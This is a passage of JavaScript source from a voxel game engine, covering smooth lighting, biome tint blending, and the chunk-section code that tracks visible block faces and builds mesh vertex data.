      blocks[3] = (getBlock(x, y-1, z-1, block) & 15)
      blocks[4] = (getBlock(x, y, z-1, block) & 15)
      blocks[5] = (getBlock(x, y+1, z-1, block) & 15)
      blocks[6] = (getBlock(x+1, y-1, z-1, block) & 15)
      blocks[7] = (getBlock(x+1, y, z-1, block) & 15)
      blocks[8] = (getBlock(x+1, y+1, z-1, block) & 15)

			ret[0] = average(blocks, 4, 1, 2, 5)
			ret[1] = average(blocks, 4, 5, 7, 8)
			ret[2] = average(blocks, 4, 3, 6, 7)
			ret[3] = average(blocks, 4, 0, 1, 3)
			return ret
		},
		east: function(x, y, z, block, ret, blockLight = 0, data, x2,y2,z2) {
      if(!data.smoothLight){
        let light = (getBlock(x, y, z, block) & 15) / 15
        if(data.name === "redstoneDust" && blockLight) light = max(light,world.getPower(x2,y2,z2)/30)
        ret[0] = light
        ret[1] = light
        ret[2] = light
        ret[3] = light
        return ret
      }

			let blocks = this.blocks
			blocks[0] = (getBlock(x+1, y-1, z-1, block) & 15)
      blocks[1] = (getBlock(x+1, y, z-1, block) & 15)
      blocks[2] = (getBlock(x+1, y+1, z-1, block) & 15)
      blocks[3] = (getBlock(x+1, y-1, z, block) & 15)
      blocks[4] = (getBlock(x+1, y, z, block) & 15)
      blocks[5] = (getBlock(x+1, y+1, z, block) & 15)
      blocks[6] = (getBlock(x+1, y-1, z+1, block) & 15)
      blocks[7] = (getBlock(x+1, y, z+1, block) & 15)
      blocks[8] = (getBlock(x+1, y+1, z+1, block) & 15)

			ret[0] = average(blocks, 4, 1, 2, 5)
			ret[1] = average(blocks, 4, 5, 7, 8)
			ret[2] = average(blocks, 4, 3, 6, 7)
			ret[3] = average(blocks, 4, 0, 1, 3)
			return ret
		},
		west: function(x, y, z, block, ret, blockLight = 0, data, x2,y2,z2) {
      if(!data.smoothLight){
        let light = (getBlock(x, y, z, block) & 15) / 15
        if(data.name === "redstoneDust" && blockLight) light = max(light,world.getPower(x2,y2,z2)/30)
        ret[0] = light
        ret[1] = light
        ret[2] = light
        ret[3] = light
        return ret
      }

			let blocks = this.blocks
			blocks[0] = (getBlock(x-1, y-1, z-1, block) & 15)
      blocks[1] = (getBlock(x-1, y, z-1, block) & 15)
      blocks[2] = (getBlock(x-1, y+1, z-1, block) & 15)
      blocks[3] = (getBlock(x-1, y-1, z, block) & 15)
      blocks[4] = (getBlock(x-1, y, z, block) & 15)
      blocks[5] = (getBlock(x-1, y+1, z, block) & 15)
      blocks[6] = (getBlock(x-1, y-1, z+1, block) & 15)
      blocks[7] = (getBlock(x-1, y, z+1, block) & 15)
      blocks[8] = (getBlock(x-1, y+1, z+1, block) & 15)

			ret[0] = average(blocks, 4, 5, 7, 8)
			ret[1] = average(blocks, 4, 1, 2, 5)
			ret[2] = average(blocks, 4, 0, 1, 3)
			ret[3] = average(blocks, 4, 3, 6, 7)
			return ret
		},
	}
  
  /*for(var it in getLight){
    if(typeof getLight[it] !== "function")continue
    getLight[it]=function(x,y,z,block,ret){
      ret[0]=ret[1]=ret[2]=ret[3]=1
      return ret
    }
  }*///for debugging

	function interpolateShadows(shadows, x, y) {
		let sx = (shadows[1] - shadows[0]) * x + shadows[0]
		let sx2 = (shadows[3] - shadows[2]) * x + shadows[2]
		return (sx2 - sx) * y + sx
	}
  
  /*
  function(x,y,z,ret){//bottom
    ret[0] = ret[2] = ret[3] = ret[5] = ret[6] = ret[8] = ret[9] = ret[11] = 1
    ret[1] = ret[4] = ret[7] = ret[10] = 0
    return ret
  }
  */
	let tintNoise = new PerlinNoise(0)
	function averageTint(ret,offset,a,b,c,d,colorOffset){
		ret[offset] = ((a.length>3 ? a[colorOffset] : a[0])+(b.length>3 ? b[colorOffset] : b[0])+(c.length>3 ? c[colorOffset] : c[0])+(d.length>3 ? d[colorOffset] : d[0]))*0.25
		ret[offset+1] = ((a.length>3 ? a[colorOffset+1] : a[1])+(b.length>3 ? b[colorOffset+1] : b[1])+(c.length>3 ? c[colorOffset+1] : c[1])+(d.length>3 ? d[colorOffset+1] : d[1]))*0.25
		ret[offset+2] = ((a.length>3 ? a[colorOffset+2] : a[2])+(b.length>3 ? b[colorOffset+2] : b[2])+(c.length>3 ? c[colorOffset+2] : c[2])+(d.length>3 ? d[colorOffset+2] : d[2]))*0.25
	}
  let getTint = {//todo n: entity tint
		none: function(ret){
			ret[0] = ret[3] = ret[6] = ret[9] = 1
			ret[1] = ret[4] = ret[7] = ret[10] = 1
			ret[2] = ret[5] = ret[8] = ret[11] = 1
			return ret
		},
    bottom: function(x,y,z,ret,dimension,block,tags){
			let tint
			let b = world.getBiome(x,y,z,dimension)
			let t = block.tint
			if(t){
				tint = t[b] || t.default
				if(performFast){
					ret[0] = ret[3] = ret[6] = ret[9] = tint[0]
					ret[1] = ret[4] = ret[7] = ret[10] = tint[1]
					ret[2] = ret[5] = ret[8] = ret[11] = tint[2]
					return ret
				}
				const north = t[world.getBiome(x,y,z-1,dimension)] || t.default
				const south = t[world.getBiome(x,y,z+1,dimension)] || t.default
				const east = t[world.getBiome(x-1,y,z,dimension)] || t.default
				const west = t[world.getBiome(x+1,y,z,dimension)] || t.default
				const northeast = t[world.getBiome(x-1,y,z-1,dimension)] || t.default
				const southeast = t[world.getBiome(x-1,y,z+1,dimension)] || t.default
				const northwest = t[world.getBiome(x+1,y,z-1,dimension)] || t.default
				const southwest = t[world.getBiome(x+1,y,z+1,dimension)] || t.default
				let noisene = 0, noisese = 0, noisenw = 0, noisesw = 0
				if(max(north.length,south.length,east.length,west.length,northeast.length,southeast.length,northwest.length,southwest.length)>3){
					noisene = (tintNoise.noise2d((x-0.5)*0.1,(z-0.5)*0.1)>0)*3
					noisese = (tintNoise.noise2d((x-0.5)*0.1,(z+0.5)*0.1)>0)*3
					noisenw = (tintNoise.noise2d((x+0.5)*0.1,(z-0.5)*0.1)>0)*3
					noisesw = (tintNoise.noise2d((x+0.5)*0.1,(z+0.5)*0.1)>0)*3
				}
				averageTint(ret,0,tint,north,east,northeast,noisene)
				averageTint(ret,3,tint,north,west,northwest,noisenw)
				averageTint(ret,6,tint,south,west,southwest,noisesw)
				averageTint(ret,9,tint,south,east,southeast,noisese)
			}else this.none(ret)
			return ret
    },
    top: function(x,y,z,ret,dimension,block,tags){
			let tint
			let b = world.getBiome(x,y,z,dimension)
			let t = block.tint
			if(t){
				tint = t[b] || t.default
				if(performFast){
					ret[0] = ret[3] = ret[6] = ret[9] = tint[0]
					ret[1] = ret[4] = ret[7] = ret[10] = tint[1]
					ret[2] = ret[5] = ret[8] = ret[11] = tint[2]
					return ret
				}
				const north = t[world.getBiome(x,y,z-1,dimension)] || t.default
				const south = t[world.getBiome(x,y,z+1,dimension)] || t.default
				const east = t[world.getBiome(x-1,y,z,dimension)] || t.default
				const west = t[world.getBiome(x+1,y,z,dimension)] || t.default
				const northeast = t[world.getBiome(x-1,y,z-1,dimension)] || t.default
				const southeast = t[world.getBiome(x-1,y,z+1,dimension)] || t.default
				const northwest = t[world.getBiome(x+1,y,z-1,dimension)] || t.default
				const southwest = t[world.getBiome(x+1,y,z+1,dimension)] || t.default
				let noisene = 0, noisese = 0, noisenw = 0, noisesw = 0
				if(max(north.length,south.length,east.length,west.length,northeast.length,southeast.length,northwest.length,southwest.length)>3){
					noisene = (tintNoise.noise2d((x-0.5)*0.1,(z-0.5)*0.1)>0)*3
					noisese = (tintNoise.noise2d((x-0.5)*0.1,(z+0.5)*0.1)>0)*3
					noisenw = (tintNoise.noise2d((x+0.5)*0.1,(z-0.5)*0.1)>0)*3
					noisesw = (tintNoise.noise2d((x+0.5)*0.1,(z+0.5)*0.1)>0)*3
				}
				averageTint(ret,0,tint,south,east,southeast,noisese)
				averageTint(ret,3,tint,south,west,southwest,noisesw)
				averageTint(ret,6,tint,north,west,northwest,noisenw)
				averageTint(ret,9,tint,north,east,northeast,noisene)
			}else this.none(ret)
			return ret
    },
    north: function(x,y,z,ret,dimension,block,tags){
			let tint
			let b = world.getBiome(x,y,z,dimension)
			let t = block.tint
			if(t){
				tint = t[b] || t.default
				if(performFast){
					ret[0] = ret[3] = ret[6] = ret[9] = tint[0]
					ret[1] = ret[4] = ret[7] = ret[10] = tint[1]
					ret[2] = ret[5] = ret[8] = ret[11] = tint[2]
					return ret
				}
				const north = t[world.getBiome(x,y+1,z,dimension)] || t.default
				const south = t[world.getBiome(x,y-1,z,dimension)] || t.default
				const east = t[world.getBiome(x+1,y,z,dimension)] || t.default
				const west = t[world.getBiome(x-1,y,z,dimension)] || t.default
				const northeast = t[world.getBiome(x+1,y+1,z,dimension)] || t.default
				const southeast = t[world.getBiome(x+1,y-1,z,dimension)] || t.default
				const northwest = t[world.getBiome(x-1,y+1,z,dimension)] || t.default
				const southwest = t[world.getBiome(x-1,y-1,z,dimension)] || t.default
				let noisene = 0, noisese = 0, noisenw = 0, noisesw = 0
				if(max(north.length,south.length,east.length,west.length,northeast.length,southeast.length,northwest.length,southwest.length)>3){
					noisene = noisese = (tintNoise.noise2d((x+0.5)*0.1,z*0.1)>0)*3
					noisenw = noisesw = (tintNoise.noise2d((x-0.5)*0.1,z*0.1)>0)*3
				}
				averageTint(ret,0,tint,north,east,northeast,noisene)
				averageTint(ret,3,tint,north,west,northwest,noisenw)
				averageTint(ret,6,tint,south,west,southwest,noisesw)
				averageTint(ret,9,tint,south,east,southeast,noisese)
			}else this.none(ret)
			return ret
    },
    south: function(x,y,z,ret,dimension,block,tags){
			let tint
			let b = world.getBiome(x,y,z,dimension)
			let t = block.tint
			if(t){
				tint = t[b] || t.default
				if(performFast){
					ret[0] = ret[3] = ret[6] = ret[9] = tint[0]
					ret[1] = ret[4] = ret[7] = ret[10] = tint[1]
					ret[2] = ret[5] = ret[8] = ret[11] = tint[2]
					return ret
				}
				const north = t[world.getBiome(x,y+1,z,dimension)] || t.default
				const south = t[world.getBiome(x,y-1,z,dimension)] || t.default
				const east = t[world.getBiome(x-1,y,z,dimension)] || t.default
				const west = t[world.getBiome(x+1,y,z,dimension)] || t.default
				const northeast = t[world.getBiome(x-1,y+1,z,dimension)] || t.default
				const southeast = t[world.getBiome(x-1,y-1,z,dimension)] || t.default
				const northwest = t[world.getBiome(x+1,y+1,z,dimension)] || t.default
				const southwest = t[world.getBiome(x+1,y-1,z,dimension)] || t.default
				let noisene = 0, noisese = 0, noisenw = 0, noisesw = 0
				if(max(north.length,south.length,east.length,west.length,northeast.length,southeast.length,northwest.length,southwest.length)>3){
					noisene = noisese = (tintNoise.noise2d((x-0.5)*0.1,z*0.1)>0)*3
					noisenw = noisesw = (tintNoise.noise2d((x+0.5)*0.1,z*0.1)>0)*3
				}
				averageTint(ret,0,tint,north,east,northeast,noisene)
				averageTint(ret,3,tint,north,west,northwest,noisenw)
				averageTint(ret,6,tint,south,west,southwest,noisesw)
				averageTint(ret,9,tint,south,east,southeast,noisese)
			}else this.none(ret)
			return ret
    },
    east: function(x,y,z,ret,dimension,block,tags){
			let tint
			let b = world.getBiome(x,y,z,dimension)
			let t = block.tint
			if(t){
				tint = t[b] || t.default
				if(performFast){
					ret[0] = ret[3] = ret[6] = ret[9] = tint[0]
					ret[1] = ret[4] = ret[7] = ret[10] = tint[1]
					ret[2] = ret[5] = ret[8] = ret[11] = tint[2]
					return ret
				}
				const north = t[world.getBiome(x,y+1,z,dimension)] || t.default
				const south = t[world.getBiome(x,y-1,z,dimension)] || t.default
				const east = t[world.getBiome(x,y,z-1,dimension)] || t.default
				const west = t[world.getBiome(x,y,z+1,dimension)] || t.default
				const northeast = t[world.getBiome(x,y+1,z-1,dimension)] || t.default
				const southeast = t[world.getBiome(x,y-1,z-1,dimension)] || t.default
				const northwest = t[world.getBiome(x,y+1,z+1,dimension)] || t.default
				const southwest = t[world.getBiome(x,y-1,z+1,dimension)] || t.default
				let noisene = 0, noisese = 0, noisenw = 0, noisesw = 0
				if(max(north.length,south.length,east.length,west.length,northeast.length,southeast.length,northwest.length,southwest.length)>3){
					noisene = noisese = (tintNoise.noise2d(x*0.1,(z-0.5)*0.1)>0)*3
					noisenw = noisesw = (tintNoise.noise2d(x*0.1,(z+0.5)*0.1)>0)*3
				}
				averageTint(ret,0,tint,north,east,northeast,noisene)
				averageTint(ret,3,tint,north,west,northwest,noisenw)
				averageTint(ret,6,tint,south,west,southwest,noisesw)
				averageTint(ret,9,tint,south,east,southeast,noisese)
			}else this.none(ret)
			return ret
    },
    west: function(x,y,z,ret,dimension,block,tags){
			let tint
			let b = world.getBiome(x,y,z,dimension)
			let t = block.tint
			if(t){
				tint = t[b] || t.default
				if(performFast){
					ret[0] = ret[3] = ret[6] = ret[9] = tint[0]
					ret[1] = ret[4] = ret[7] = ret[10] = tint[1]
					ret[2] = ret[5] = ret[8] = ret[11] = tint[2]
					return ret
				}
				const north = t[world.getBiome(x,y+1,z,dimension)] || t.default
				const south = t[world.getBiome(x,y-1,z,dimension)] || t.default
				const east = t[world.getBiome(x,y,z+1,dimension)] || t.default
				const west = t[world.getBiome(x,y,z-1,dimension)] || t.default
				const northeast = t[world.getBiome(x,y+1,z+1,dimension)] || t.default
				const southeast = t[world.getBiome(x,y-1,z+1,dimension)] || t.default
				const northwest = t[world.getBiome(x,y+1,z-1,dimension)] || t.default
				const southwest = t[world.getBiome(x,y-1,z-1,dimension)] || t.default
				let noisene = 0, noisese = 0, noisenw = 0, noisesw = 0
				if(max(north.length,south.length,east.length,west.length,northeast.length,southeast.length,northwest.length,southwest.length)>3){
					noisene = noisese = (tintNoise.noise2d(x*0.1,(z+0.5)*0.1)>0)*3
					noisenw = noisesw = (tintNoise.noise2d(x*0.1,(z-0.5)*0.1)>0)*3
				}
				averageTint(ret,0,tint,north,east,northeast,noisene)
				averageTint(ret,3,tint,north,west,northwest,noisenw)
				averageTint(ret,6,tint,south,west,southwest,noisesw)
				averageTint(ret,9,tint,south,east,southeast,noisese)
			}else this.none(ret)
			return ret
    },
  }

	class Section {
		constructor(x, y, z, chunk, blocks = undefined) {
			this.x = x
			this.y = y
			this.z = z
			this.arraySize = 4096
			this.blocks = blocks || new Int32Array(this.arraySize)
			this.blockLight = new Uint8Array(this.arraySize)
			this.skyLight = new Uint8Array(this.arraySize)
      this.tags = new Array(this.arraySize) //tags are like nbt in minecraft
			this.renderData = []
			this.renderLength = 0
			this.faces = 0
			this.chunk = chunk
      this.world = (chunk && chunk.world) || world
      this.type = chunk && chunk.type
			this.pallete = [0]
			this.palleteMap = {"0": 0}
			this.palleteSize = 0
			this.ambients = []
			this.hasAmbients = false
		}
		getBlock(x, y, z) {
			return this.blocks[x * 256 + y * 16 + z]
		}
		setBlock(x, y, z, blockId) {
			this.blocks[x * 256 + y * 16 + z] = blockId
		}
		deleteBlock(x, y, z) {
			this.blocks[x * 256 + y * 16 + z] = 0
		}
		optimizeBlock(x, y, z, localBlocks, blockState, flags = 63){ //Flags tell if a face is possibly visible
			let palleteIndex
			if (this.palleteMap[blockState] === undefined) {
				this.palleteMap[blockState] = this.pallete.length
				palleteIndex = this.pallete.length
				this.pallete.push(blockState)
			} else {
				palleteIndex = this.palleteMap[blockState]
			}

			const visible = (
				(flags&32&& hideFace(x-1, y, z, localBlocks, blockState, getBlock, "west", "east", this, x,y,z))
			| (flags&16&& hideFace(x+1, y, z, localBlocks, blockState, getBlock, "east", "west", this, x,y,z)) << 1
			| (flags&1 && hideFace(x, y-1, z, localBlocks, blockState, getBlock, "bottom", "top", this, x,y,z)) << 2
			| (flags&2 && hideFace(x, y+1, z, localBlocks, blockState, getBlock, "top", "bottom", this, x,y,z)) << 3
			| (flags&8 && hideFace(x, y, z-1, localBlocks, blockState, getBlock, "south", "north", this, x,y,z)) << 4
			| (flags&4 && hideFace(x, y, z+1, localBlocks, blockState, getBlock, "north", "south", this, x,y,z)) << 5)
			if (visible) {
				const pos = (x | y << 4 | z << 8) << 19
				this.renderData[this.renderLength++] = 1 << 31 | pos | visible << 13 | palleteIndex
				//this.extraRenderData[this.renderLength-1] = getRandomRotate(blockState,x+this.x,y+this.y,z+this.z,visible)
			}

			if(blockData[blockState].ambientSound || blockData[blockState].temperature !== undefined){
				const pos = (x | y << 4 | z << 8) << 19
				this.ambients[this.ambients.length] = 1 << 31 | pos | palleteIndex
				this.hasAmbients = true
			}
		}
		optimize(){
			let {world} = this
			let localBlocks = world.getAdjacentSubchunks(this.x, this.y, this.z, 0, this.type)
			/*let xLoaded = world.getChunk(this.x-16,this.z,this.type); xLoaded = xLoaded&&xLoaded.loaded ? null : 0
			let XLoaded = world.getChunk(this.x+16,this.z,this.type); XLoaded = XLoaded&&XLoaded.loaded ? null : 16
			let zLoaded = world.getChunk(this.x,this.z-16,this.type); zLoaded = zLoaded&&zLoaded.loaded ? null : 0
			let ZLoaded = world.getChunk(this.x,this.z+16,this.type); ZLoaded = ZLoaded&&ZLoaded.loaded ? null : 16*/
			for (let x = 0; x < 16; x++) for (let z = 0; z < 16; z++) for (let y = 0; y < 16; y++){
				let block = this.blocks[x * 256 + y * 16 + z]
				if(block){
					this.optimizeBlock(x,y,z,localBlocks,block/*, 3 | (z!==ZLoaded)<<2 | (z!==zLoaded)<<3 | (x!==XLoaded)<<4 | (x!==xLoaded)<<5*/)
				}
			}
			/*//Check all the blocks in the subchunk to see if they're visible.
			//Visible flags: bottom, top, north, south, east, west
			let visFlags = new Int8Array(4096), index = 0
			let localBlocks = this.world.getAdjacentSubchunks(this.x, this.y, this.z, 0, this.type)
			for (let x = 0; x < 16; x++) {
				for (let i = 0; i < 256; i++, index++) {
					const y = i >> 4
					const z = i & 15
					const blockState = this.blocks[index]
					const block = blockData[blockState]
					//Show if neighbour is in another section because the neighbour block is unknown
					visFlags[index] |= (!y) | (y === 15)<<1 | (z === 15)<<2 | (!z)<<3 | (x === 15)<<4 | (!x)<<5
					if(block.transparent || block.customCullFace){
						//This does not hide edge faces of neighbour sections
						if(y) visFlags[index-16] |= 2//Top face of bottom block
						if(y < 15) visFlags[index+16] |= 1//Bottom face of top block
						if(z)      visFlags[index - 1] |= 4 // South face of North block is visible
						if(z < 15) visFlags[index + 1] |= 8 // North face of South block is visible
						if(x)      visFlags[index - 256] |= 16 // West face of East block is visible
						if(x < 15) visFlags[index + 256] |= 32 // East face of West block is visible
					}
				}
				await yieldThread()
			}
			for(let i=0; i<visFlags.length; i++){
				if(this.blocks[i] && visFlags[i]){
					this.optimizeBlock(i>>8, i>>4&15, i&15, localBlocks, this.blocks[i], visFlags[i])
				}
			}*/
		}
		updateBlock(x, y, z, noOnupdate, sx,sy,sz) {
			if (this.chunk.buffer && !this.world.meshQueue.includes(this.chunk)) {
				this.world.meshQueue.push(this.chunk)
			}
			let i = x
			let j = y
			let k = z
			x += this.x
			y += this.y
			z += this.z
			let blockState = this.blocks[i * 256 + j * 16 + k]
			let visible = blockState && (hideFace(x-1, y, z, 0, blockState, this.world.getBlock, "west", "east", this, i,j,k)
			| hideFace(x+1, y, z, 0, blockState, this.world.getBlock, "east", "west", this, i,j,k) << 1
			| hideFace(x, y-1, z, 0, blockState, this.world.getBlock, "bottom", "top", this, i,j,k) << 2
			| hideFace(x, y+1, z, 0, blockState, this.world.getBlock, "top", "bottom", this, i,j,k) << 3
			| hideFace(x, y, z-1, 0, blockState, this.world.getBlock, "south", "north", this, i,j,k) << 4
			| hideFace(x, y, z+1, 0, blockState, this.world.getBlock, "north", "south", this, i,j,k) << 5)
			let pos = (i | j << 4 | k << 8) << 19
			let index = -1

			// Find index of current block in this.renderData
			for (let i = 0; i < this.renderLength; i++) {
				if ((this.renderData[i] & 0x7ff80000) === pos) {
					index = i
					break
				}
			}

			// Update pallete
			if (this.palleteMap[blockState] === undefined) {
				this.palleteMap[blockState] = this.pallete.length
				this.pallete.push(blockState)
			}

			//have to put this here because the ones below have return
			let hasAmbient = blockData[blockState].ambientSound || blockData[blockState].temperature || blockData[blockState].temperature === 0, ambientIdx = -1
			for (let i = 0; i < this.ambients.length; i++) {
				if ((this.ambients[i] & 0x7ff80000) === pos) {
					ambientIdx = i
					break
				}
			}
			if(ambientIdx >= 0 && !hasAmbient){
				this.ambients.splice(ambientIdx,1)
				this.hasAmbients = !!this.ambients.length
			}else{
				if(ambientIdx < 0 && hasAmbient){
					ambientIdx = this.ambients.length++
					this.hasAmbients = true
				}
				this.ambients[ambientIdx] = 1 << 31 | pos | this.palleteMap[blockState]
			}

			if (index < 0 && !visible) {
				// Wasn't visible before, isn't visible after.
				return
			}
			if (!visible) {
				// Was visible before, isn't visible after.
				this.renderData.splice(index, 1)
				this.renderLength--
				return
			}
			if (visible && index < 0) {
				// Wasn't visible before, is visible after.
				index = this.renderLength++
			}
			this.renderData[index] = 1 << 31 | pos | visible << 13 | this.palleteMap[blockState]
			//this.extraRenderData[index] = getRandomRotate(blockState,i+this.x,j+this.y,k+this.z,visible)
      /*else if(!noOnupdate){
        if((block & STAIR) === STAIR || (block & CORNERSTAIRIN) === CORNERSTAIRIN || (block & CORNERSTAIROUT) === CORNERSTAIROUT){
          let front, back //front is lower side
          let rot = block & ROTATION
          switch(rot){
            case NORTH:
              front = this.world.getBlock(x,y,z-1,this.type)
              back = this.world.getBlock(x,y,z+1,this.type)
              break
            case SOUTH:
              front = this.world.getBlock(x,y,z+1,this.type)
              back = this.world.getBlock(x,y,z-1,this.type)
              break
            case EAST:
              front = this.world.getBlock(x-1,y,z,this.type)
              back = this.world.getBlock(x+1,y,z,this.type)
              break
            case WEST:
              front = this.world.getBlock(x+1,y,z,this.type)
              back = this.world.getBlock(x-1,y,z,this.type)
              break
          }
          front = front
          back = back
          let frontType = (front & STAIR) === STAIR && 1 || (front & CORNERSTAIRIN) === CORNERSTAIRIN && 2 || (front & CORNERSTAIROUT) === CORNERSTAIROUT && 3 || 0
          let backType = (back & STAIR) === STAIR && 1 || (back & CORNERSTAIRIN) === CORNERSTAIRIN && 2 || (back & CORNERSTAIROUT) === CORNERSTAIROUT && 3 || 0
          let target = blockData[block].id, rotate = 0, type = STAIR
          if(frontType === 1){
            switch(front & ROTATION){
              case NORTH:
                if(rot === EAST) type = CORNERSTAIRIN
                else if(rot === WEST){ rotate = 1; type = CORNERSTAIRIN }
                break
            }
          }
          target |= type
          if(rotate){
            switch(rot){
              case NORTH:
                target |= EAST
                break
              case EAST:
                target |= SOUTH
                break
              case SOUTH:
                target |= WEST
                break
              case WEST:
                target |= NORTH
                break
            }
          }else target |= rot
          if(block !== target) this.world.setBlock(x,y,z,target,false,false,false,false,this.type)
        }
      }*/
		}
		async genMesh(barray, index) {
			if (!this.renderLength) {
				return index
			}
			let length = this.renderLength
			let rData = this.renderData
			let x = 0, y = 0, z = 0, loc = 0, data = 0,
				sides = 0, tex = null, x2 = 0, y2 = 0, z2 = 0,
				verts = null, texVerts = null, texShapeVerts = null, originalShapeVerts = null,
				tx = 0, ty = 0, tw = 0, th = 0,
        randomRotate, tsx0, tsy0, tsx1, tsy1, tsx2, tsy2, tsx3, tsy3, tstemp
			let wx = this.x, wy = this.y, wz = this.z
			let blocks = this.world.getAdjacentSubchunks(wx, wy, wz, 0, this.type)
			let skyLightChunks = this.world.getAdjacentSubchunks(wx, wy, wz, 1, this.type)
			let blockLightChunks = this.world.getAdjacentSubchunks(wx, wy, wz, 3, this.type)
			let tagChunks = this.world.getAdjacentSubchunks(wx, wy, wz, 2, this.type)
			let block = null, id = 0, tags = null, shapeNormal = null, normal = null
			let randomHeight, randomOffsetX, randomOffsetZ
			let x3, y3, z3

			let shadows = null, slights = [0, 0, 0, 0], blights = [0, 0, 0, 0], tints = [1,1,1,1,1,1,1,1,1,1,1,1]
			let side = ""
			let shapeVerts = null
			let shapeTexVerts = null
      let shapeOriginalVerts = null
			let pallete = this.pallete
			const {performanceFast} = settings
			// let intShad = interpolateShadows
			
			for (let i = 0; i < length; i++) {
				data = rData[i]
        id = pallete[data & 0x1fff]
				block = blockData[id]
				tex = block.textures
				sides = data >> 13 & 0x3f
				loc = data >> 19 & 0xfff
				x = loc & 15
				y = loc >> 4 & 15
				z = loc >> 8 & 15

				x2 = x + this.x
				y2 = y + this.y
				z2 = z + this.z
        
        tags = getBlock(x,y,z,tagChunks)
				randomHeight = block.randomHeight ? hash3(x2,y2,z2)*-0.5 : (block.randomSmallHeight ? hash3(x2,y2,z2)*-0.25 : 0)
				randomOffsetX = block.randomOffset ? hash(x2,z2)*0.5-0.25 : 0
				randomOffsetZ = block.randomOffset ? hash(z2,x2)*0.5-0.25 : 0
				x3 = x2+randomOffsetX, y3 = y2+randomHeight, z3 = z2+randomOffsetZ

				shapeVerts = block.shape.verts
				shapeTexVerts = block.shape.texVerts
				shapeNormal = block.shape.normal

				let texNum = 0
				for (let n = 0; n < 6; n++) {
					side = blockSides[n]
					if (sides & Block[side]) {
						shadows = getShadows[side](x, y, z, blocks)
						slights = getLight[side](x, y, z, skyLightChunks, slights, 0, block, x2,y2,z2)
						blights = getLight[side](x, y, z, blockLightChunks, blights, 1, block, x2,y2,z2)
						let directionalFaces = shapeVerts[n]
						for (let facei = 0; facei < directionalFaces.length; facei++) {
							verts = directionalFaces[facei]
							texShapeVerts = shapeTexVerts[n][facei]
              texVerts = textureCoords[textureMap[texShapeVerts.texture] || tex && textureMap[tex[texNum]] || textureMap.error]
            	tints = texShapeVerts.tintindex>-1 ? getTint[side](x2, y2, z2, tints, this.type, block, tags) : getTint.none(tints)
							if(block.customShape){
								verts = verts.slice()
								texShapeVerts = texShapeVerts.slice()
								texVerts = texVerts.slice()
								if(block.customShape(x2,y2,z2,this.type,id,side,verts,texShapeVerts,texVerts,tags,originalShapeVerts) === false) continue
							}
							if(block.customTexture && (block.alwaysCustomTexture || !performFast)){
								const customTexture = block.customTexture(x2,y2,z2,this.type,id,side,originalShapeVerts,tags)
								if(customTexture) texVerts = textureCoords[textureMap[customTexture]]
								else if(customTexture === false) continue
							}
							/*if(block.randomRotate && (side === "top" && block.randomRotateTop || side === "bottom" && block.randomRotateBottom || side === "north" && block.randomRotateNorth || side === "east" && block.randomRotateEast || side === "south" && block.randomRotateSouth || side === "west" && block.randomRotateWest)){
								if(block.randomRotate === "pattern"){
									let i, j, e
									if(n === 0 || n === 1){
										i = z, j = x, e = y
									}else if(n === 2 || n === 3){
										i = y, j = x, e = z
									}else{
										i = y, j = z, e = x
									}
									if(mod(i,2)){
										randomRotate = mod(j,2)
									}else{
										randomRotate = 3-mod(j,2)
									}
								}else{
									randomRotate = hash5(x,y,z,facei,n)
									if(block.randomRotate === "flip") randomRotate = floor(randomRotate*2)*2
									else randomRotate = floor(randomRotate*4)
								}
							}else randomRotate = 0*/
							/*texIdx0 = ((randomRotate)&3)*2
							texIdx1 = ((randomRotate+1)&3)*2
							texIdx2 = ((randomRotate+2)&3)*2
							texIdx3 = ((randomRotate+3)&3)*2*/
							tsx0 = texShapeVerts[0], tsy0 = texShapeVerts[1]
							tsx1 = texShapeVerts[2], tsy1 = texShapeVerts[3]
							tsx2 = texShapeVerts[4], tsy2 = texShapeVerts[5]
							tsx3 = texShapeVerts[6], tsy3 = texShapeVerts[7]
							/*if(randomRotate === 2){
								tsx0 = 1-tsx0, tsy0 = 1-tsy0
								tsx1 = 1-tsx1, tsy1 = 1-tsy1
								tsx2 = 1-tsx2, tsy2 = 1-tsy2
								tsx3 = 1-tsx3, tsy3 = 1-tsy3
							}else if(randomRotate === 1){
								tstemp = tsx0
								tsx0 = tsy0, tsy0 = 1-tstemp
								tstemp = tsx1
								tsx1 = tsy1, tsy1 = 1-tstemp
								tstemp = tsx2
								tsx2 = tsy2, tsy2 = 1-tstemp
								tstemp = tsx3
								tsx3 = tsy3, tsy3 = 1-tstemp
							}else if(randomRotate === 3){
								tstemp = tsx0
								tsx0 = 1-tsy0, tsy0 = tstemp
								tstemp = tsx1
								tsx1 = 1-tsy1, tsy1 = tstemp
								tstemp = tsx2
								tsx2 = 1-tsy2, tsy2 = tstemp
								tstemp = tsx3
								tsx3 = 1-tsy3, tsy3 = tstemp
							}*/
							normal = shapeNormal[n][facei]
							if(!block.shade) shadows.fill(-1)

							tx = texVerts[0]
							ty = texVerts[1]
							tw = texVerts[2]-tx
							th = texVerts[5]-ty
							if(block.name === "endPortal"){
								tx = ty = -1
								tw = th = 0
							}

							barray[index] = verts[0] + x3
							barray[index+1] = verts[1] + y3
							barray[index+2] = verts[2] + z3
							barray[index+3] = tx + tsx0*tw
							barray[index+4] = ty + tsy0*th
							barray[index+5] = normal[0]
							barray[index+6] = normal[1]
							barray[index+7] = normal[2]
							barray[index+8] = shadows[0]
							barray[index+9] = slights[0]
							barray[index+10] = blights[0]
              barray[index+11] = tints[0]
              barray[index+12] = tints[1]
              barray[index+13] = tints[2]

							barray[index+14] = verts[3] + x3
							barray[index+15] = verts[4] + y3
							barray[index+16] = verts[5] + z3
							barray[index+17] = tx + tsx1*tw
							barray[index+18] = ty + tsy1*th
							barray[index+19] = normal[0]
							barray[index+20] = normal[1]
							barray[index+21] = normal[2]
							barray[index+22] = shadows[1]
							barray[index+23] = slights[1]
							barray[index+24] = blights[1]
              barray[index+25] = tints[3]
              barray[index+26] = tints[4]
              barray[index+27] = tints[5]

							barray[index+28] = verts[6] + x3
							barray[index+29] = verts[7] + y3
							barray[index+30] = verts[8] + z3
							barray[index+31] = tx + tsx2*tw
							barray[index+32] = ty + tsy2*th
							barray[index+33] = normal[0]
							barray[index+34] = normal[1]
							barray[index+35] = normal[2]
							barray[index+36] = shadows[2]
							barray[index+37] = slights[2]
							barray[index+38] = blights[2]
              barray[index+39] = tints[6]
              barray[index+40] = tints[7]
              barray[index+41] = tints[8]

							barray[index+42] = verts[9] + x3
							barray[index+43] = verts[10] + y3
							barray[index+44] = verts[11] + z3
							barray[index+45] = tx + tsx3*tw
							barray[index+46] = ty + tsy3*th
